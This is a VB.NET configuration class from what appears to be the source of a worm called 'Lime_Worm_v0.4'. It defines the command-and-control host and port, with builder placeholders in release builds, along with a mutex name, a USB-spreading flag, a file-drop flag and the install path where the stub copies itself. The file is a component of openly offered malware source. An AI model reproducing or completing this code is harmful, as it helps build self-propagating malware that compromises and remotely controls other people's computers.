Public Class Settings

    'For testing use debug compiler

#If DEBUG Then
    Public Shared HOST As String = "127.0.0.1"
    Public Shared PORT As Integer = "8989"
    Public Shared EXE As String = "Stub.exe"
    Public Shared NMT As Threading.Mutex = Nothing
    Public Shared MTX As String = "Lime_Worm_v0.4"
    Public Shared USB As Boolean = False
    Public Shared DROP As Boolean = False
    Public Shared PATH1 As String = "Lime"
    Public Shared PATH2 As String = "Lime2"
    Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
#Else
    Public Shared HOST As String = "%HOST%"
        Public Shared PORT As Integer = "%PORT%"
        Public Shared EXE As String = "%EXE%"
        Public Shared NMT As Threading.Mutex = Nothing
        Public Shared MTX As String = "Lime_Worm_v0.4"
        Public Shared USB As Boolean = "%USB%"
        Public Shared DROP As Boolean = "%DROP%"
        Public Shared PATH1 As String = "%PATH1%"
        Public Shared PATH2 As String = "%PATH2%"
        Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
#End If

End Class
